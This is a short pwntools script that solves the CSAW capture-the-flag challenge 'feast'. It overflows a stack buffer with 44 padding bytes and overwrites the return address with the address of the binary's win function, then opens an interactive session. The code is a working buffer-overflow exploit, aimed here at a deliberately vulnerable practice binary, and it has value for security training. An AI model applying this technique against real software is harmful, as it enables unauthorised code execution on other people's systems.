#solve feast

from pwn import *

local = True
debug = False
if local:
    if debug:
        p = gdb.debug('./feast_docker',
            '''
            break *0x08048606
            continue
            ''')
    else:
        #p = process('./feast')
        p = remote('localhost', 5000)
else:
    p = remote('pwn.chal.csaw.io', 5001)

e = ELF('./feast')
#print("win is at " + hex(e.sym['winner_winner_chicken_dinner']))

p.recvuntil("> ")
payload = 'A' * 44 + p32(e.sym['winner_winner_chicken_dinner'])

p.send(payload + "\n")
p.interactive()
